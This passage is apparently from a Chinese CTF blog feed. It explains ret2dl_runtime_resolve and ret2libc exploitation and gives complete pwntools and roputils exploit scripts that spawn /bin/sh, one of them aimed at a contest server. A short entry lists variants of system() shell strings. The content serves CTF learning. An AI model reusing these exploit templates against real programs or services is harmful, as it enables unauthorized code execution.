<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br></pre></td></tr></table></figure>
<p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p>成员 | 说明<br>-|-|-<br>sh_name |节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。<br>sh_type |根据节的内容和语义进行分类，具体的类型下面会介绍。<br>sh_flags |每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。<br>sh_addr |如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。<br>sh_offset |给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset|成员给出的是概念性的偏移。<br>sh_size |此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。<br>sh_link |此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。<br>sh_info |此成员给出附加信息，其解释依赖于节区类型。<br>sh_addralign |某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。<br>sh_entsize|某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。<br>sh_addr就是取这个地址，取进程镜像中的地址</p>
<h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul>
<li>如果这部分不理解，你就。。。</li>
<li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li>
<li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li>
</ul>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line"><span class="comment">#对齐</span></span><br></pre></td></tr></table></figure>
<p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p>
<p>0x8048a00 11111111 22222222 33333333 44444444  dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444 </p>
<p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p>
<ul>
<li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li>
<li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li>
<li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li>
</ul>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line"><span class="comment">#构造.rel.plt表</span></span><br></pre></td></tr></table></figure>
<ul>
<li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li>
<li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li>
<li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li>
<li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li>
<li>flat([])就是将里面的全变成字符</li>
</ul>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br></pre></td></tr></table></figure>
<ul>
<li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li>
<li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li>
</ul>
<h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br></pre></td></tr></table></figure>
<p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p>
<h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p>
<h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>初始化ROP链和参数<h4 id="第二部分-1"><a href="#第二部分-1" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure></li>
<li>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</li>
<li>然后传入偏移,32位是用栈传参的，也就是这样</li>
<li>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</li>
</ul>
<h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>bbbb为返回地址</li>
<li>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数<br>这里具体为什么是这里，你可以从gdb调试看出来，他里面<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;:	push   eax</span><br><span class="line">   0xf7f7e6c1 &lt;+1&gt;:	push   ecx</span><br><span class="line">   0xf7f7e6c2 &lt;+2&gt;:	push   edx</span><br><span class="line">   0xf7f7e6c3 &lt;+3&gt;:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7f7e6c7 &lt;+7&gt;:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7f7e6cb &lt;+11&gt;:	call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7f7e6d0 &lt;+16&gt;:	pop    edx</span><br><span class="line">   0xf7f7e6d1 &lt;+17&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7f7e6d4 &lt;+20&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7f7e6d7 &lt;+23&gt;:	mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7f7e6db &lt;+27&gt;:	ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcup4ilbj30yw0md7d6.jpg" alt="4"></li>
<li>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcuukgx1j30xq0p8ti8.jpg" alt="5"></li>
<li>这里arg[0]就是返回地址，</li>
<li>arg[1]就是参数了</li>
<li>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</li>
</ul>
<h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>进行填充，使位置达到base_stage + 24</li>
</ul>
<h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure>
<ul>
<li>填入.rel.plt里的一个结构体，用于解析函数</li>
</ul>
<h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>填充对齐部分<h4 id="第七部分"><a href="#第七部分" class="headerlink" title="第七部分"></a>第七部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure></li>
<li>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</li>
</ul>
<h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br></pre></td></tr></table></figure>
<ul>
<li>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh<h4 id="第十部分"><a href="#第十部分" class="headerlink" title="第十部分"></a>第十部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p>
<h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul>
<li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li>
<li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li>
<li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了</li>
</ul>
<p><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">'pwn'</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./'</span> + processName)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">rop = ROP(<span class="string">'./'</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul>
<li>以后遇到高级ROP这种题就一把梭了</li>
<li>妈妈在也不用担心我遇到栈的这种问题了</li>
<li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li>
</ul>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn细节</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<ol>
<li>system(“/bin/sh”)</li>
<li>system(“sh”)</li>
<li>system(“/bin/bash”)</li>
<li>system(“bash”)</li>
<li>system(“$0”)</li>
</ol><p>若还不成，可试试在参数后面加;#<br>比如system(“/bin/sh;#”)<br>这是由于函数的特殊性，有些函数会截断特殊字符</p>]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>细节</category>
      </categories>
      <tags>
        <tag>pwn， 细节</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn01</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn-01"><a href="#pwn-01" class="headerlink" title="pwn-01"></a>pwn-01</h1><p>题目不难，很明显能看出ROP</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>gets没有限制长度，然后有个麻烦的地方就是对payload进行了一轮加密操作，然后过了这部分后，还要记住他是64位程序，用寄存器传前5个还是前6个参数来着，忘了，不重要，不过确定的是第一位是用的rdi，所以需要<br>ROPgadget –binary Emachine –only ‘pop|ret’<br>然后找到那个地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$ROPgadget</span> --binary Emachine --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>

<p>然后加密部分在加密一次就完了，异或加密可逆</p>
<h2 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="keyword">if</span> ord(payload[x]) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(payload[x]) &lt;=<span class="number">64</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(payload[x]) &gt; <span class="number">47</span> <span class="keyword">and</span> ord(payload[x]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    result += chr(ord(payload[x]) ^ <span class="number">0xf</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += payload[x]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += chr(ord(payload[x]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += chr(ord(payload[x]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"><span class="comment">#io = process("./Emachine")</span></span><br><span class="line">io = remote(<span class="string">"172.29.14.110"</span>, <span class="number">8888</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Emachine'</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">start = <span class="number">0x0000000000400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">__libc_start_main_plt = elf.plt[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure>
<p>初始化部分，offset是0x58，本地是和远程libc不一样</p>
<h2 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(puts_plt)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_got)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_plt)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#encrypt</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    payload = p64(__libc_start_main_got<span class="number">-1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*offset +  p64(pop_rdi) + p64(__libc_start_main_got<span class="number">-1</span>) + p64(puts_plt) +  p64(<span class="number">0x0000000000400B28</span>) </span><br><span class="line">    payload = Decrypt(payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"Ciphertext\n"</span>)</span><br><span class="line">    <span class="comment">#print "io.recv =" + io.recv()</span></span><br><span class="line">    <span class="comment">#io.sendline("1")</span></span><br><span class="line">    <span class="comment">#result = io.recvuntil("\nE", drop= True)[-8:]</span></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = u64(result[:<span class="number">-1</span>]+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#泄露libc地址</span></span><br><span class="line">    <span class="keyword">print</span> hex(result)</span><br><span class="line"></span><br><span class="line">    __libc_start_main_addr = result</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'a'</span>*offset  + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment">#print "addr " + hex(u64(io.recv(8)))</span></span><br><span class="line">    <span class="comment">#print hex(u64(io.recv(8)))</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print len(io.recv(8))</span></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

